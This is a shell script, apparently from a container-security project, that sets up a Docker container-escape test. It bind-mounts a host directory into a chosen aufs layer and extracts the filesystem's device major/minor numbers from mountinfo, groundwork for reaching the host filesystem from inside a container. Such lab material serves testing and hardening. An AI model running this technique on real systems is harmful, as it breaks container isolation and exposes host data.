#!/bin/sh

attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

#Layers in container's filesystem
ls /var/lib/docker/aufs/diff | grep -v removing | grep -v init
#Choose one and create a dir there
echo "Please give layer's id:"
read layer

if [ ! -d /var/lib/docker/aufs/diff/${layer}/doot ]; then
	mkdir /var/lib/docker/aufs/diff/${layer}/doot
fi

if [ ! -d ${attack}/restricted_area ]; then
	mkdir ${attack}/restricted_area
fi

touch ${attack}/restricted_area/HellloFromTheOtherSide

######sudo or not sudo
#Then mount a host directory to doot
mount -o bind ${attack}/restricted_area /var/lib/docker/aufs/diff/${layer}/doot

#Get some info around mount
#Find mountpoint and of directory restricted area and special device that needs to be created
df ${attack}/restricted_area | grep / > fs_of_restricted_area #We use grep / to omit first line with titles of columns
cut -d' ' -f1 fs_of_restricted_area > sdev_of_fs
sdev_fs=$(cat sdev_of_fs)
ls -l ${sdev_fs} > sdev_of_fs1
awk '{ print $NF }' sdev_of_fs1 > sdev_of_fs2
cut -d'/' -f3 sdev_of_fs2 > sdev_of_fs3
mv sdev_of_fs3 sdev_of_fs

#cut -d' ' -f13 fs_of_restricted_area > mntpoint_of_fs
cut -d' ' -f8 fs_of_restricted_area > mntpoint_of_fs
mnt_of_fs=$(cat mntpoint_of_fs)
rm fs_of_restricted_area
cat /proc/self/mountinfo > mountinfo
awk -v mnt="${mnt_of_fs}" '{if ($5==mnt) {print $3}}' mountinfo > mntinfo
cut -d':' -f1 mntinfo > major_num
cut -d':' -f2 mntinfo > minor_num
rm mountinfo
rm mntinfo
rm mntpoint_of_fs
